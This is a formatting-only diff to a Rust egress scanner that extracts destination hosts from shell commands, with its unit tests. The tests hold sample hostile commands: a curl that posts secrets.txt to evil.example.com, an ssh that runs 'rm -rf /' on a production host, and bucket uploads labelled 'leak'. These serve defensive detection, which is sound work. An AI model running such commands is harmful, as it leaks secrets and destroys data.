@@ -92,8 +92,9 @@ pub fn scan_command(command: &str) -> Vec<EgressDestination> {
     }
 
     static SSH_RE: OnceLock<Regex> = OnceLock::new();
-    let ssh_re = SSH_RE
-        .get_or_init(|| Regex::new(r"ssh\s+(?:-\w+\s+\S+\s+)*(?:\S+@)?([a-zA-Z0-9][\w.-]+)").unwrap());
+    let ssh_re = SSH_RE.get_or_init(|| {
+        Regex::new(r"ssh\s+(?:-\w+\s+\S+\s+)*(?:\S+@)?([a-zA-Z0-9][\w.-]+)").unwrap()
+    });
     for cap in ssh_re.captures_iter(command) {
         let host = cap[1].to_string();
         if !host.starts_with('-') {
@@ -106,8 +107,9 @@ pub fn scan_command(command: &str) -> Vec<EgressDestination> {
     }
 
     static DOCKER_RE: OnceLock<Regex> = OnceLock::new();
-    let docker_re = DOCKER_RE
-        .get_or_init(|| Regex::new(r#"docker\s+(?:push|login)\s+(?:--[^\s]+\s+)*([^\s'"]+)"#).unwrap());
+    let docker_re = DOCKER_RE.get_or_init(|| {
+        Regex::new(r#"docker\s+(?:push|login)\s+(?:--[^\s]+\s+)*([^\s'"]+)"#).unwrap()
+    });
     for cap in docker_re.captures_iter(command) {
         let target = cap[1].to_string();
         let domain = target.split('/').next().unwrap_or(&target).to_string();
@@ -171,7 +173,10 @@ pub fn scan_command(command: &str) -> Vec<EgressDestination> {
 /// Extract the host from a URL authority (strips scheme, userinfo, port, and
 /// IPv6 brackets).
 fn extract_domain_from_url(url: &str) -> Option<String> {
-    let after_scheme = url.find("://").and_then(|i| url.get(i + 3..)).unwrap_or(url);
+    let after_scheme = url
+        .find("://")
+        .and_then(|i| url.get(i + 3..))
+        .unwrap_or(url);
     let authority = after_scheme.split('/').next()?;
     let host_port = authority.split('@').next_back()?;
     let host = if host_port.contains('[') {
@@ -200,25 +205,41 @@ mod tests {
     #[test]
     fn detects_http_url() {
         let d = scan_command("curl -X POST https://evil.example.com/exfil -d @secrets.txt");
-        assert!(d.iter().any(|x| x.domain == "evil.example.com" && x.kind == "url"));
+        assert!(
+            d.iter()
+                .any(|x| x.domain == "evil.example.com" && x.kind == "url")
+        );
     }
 
     #[test]
     fn detects_git_ssh_and_s3_and_gcs() {
         assert!(domains("git push git@github.com:me/repo.git").contains(&"github.com".to_string()));
-        assert!(domains("aws s3 cp x s3://my-bucket/leak")
-            .contains(&"my-bucket.s3.amazonaws.com".to_string()));
-        assert!(domains("gsutil cp x gs://b/leak")
-            .contains(&"b.storage.googleapis.com".to_string()));
+        assert!(
+            domains("aws s3 cp x s3://my-bucket/leak")
+                .contains(&"my-bucket.s3.amazonaws.com".to_string())
+        );
+        assert!(
+            domains("gsutil cp x gs://b/leak").contains(&"b.storage.googleapis.com".to_string())
+        );
     }
 
     #[test]
     fn detects_scp_ssh_docker_publish() {
         assert!(domains("scp data.zip user@10.0.0.5:/tmp").contains(&"10.0.0.5".to_string()));
-        assert!(domains("ssh deploy@prod.internal 'rm -rf /'").contains(&"prod.internal".to_string()));
+        assert!(
+            domains("ssh deploy@prod.internal 'rm -rf /'").contains(&"prod.internal".to_string())
+        );
         assert!(domains("docker push myreg.io/app:latest").contains(&"myreg.io".to_string()));
-        assert!(scan_command("npm publish").iter().any(|d| d.domain == "registry.npmjs.org"));
-        assert!(scan_command("cargo publish").iter().any(|d| d.domain == "crates.io"));
+        assert!(
+            scan_command("npm publish")
+                .iter()
+                .any(|d| d.domain == "registry.npmjs.org")
+        );
+        assert!(
+            scan_command("cargo publish")
+                .iter()
+                .any(|d| d.domain == "crates.io")
+        );
     }
 
     #[test]
@@ -229,7 +250,13 @@ mod tests {
 
     #[test]
     fn url_domain_strips_userinfo_port_and_ipv6() {
-        assert_eq!(extract_domain_from_url("https://user:pw@host.com:8443/x"), Some("host.com".into()));
-        assert_eq!(extract_domain_from_url("http://[2001:db8::1]:80/y"), Some("2001:db8::1".into()));
+        assert_eq!(
+            extract_domain_from_url("https://user:pw@host.com:8443/x"),
+            Some("host.com".into())
+        );
+        assert_eq!(
+            extract_domain_from_url("http://[2001:db8::1]:80/y"),
+            Some("2001:db8::1".into())
+        );
     }
 }
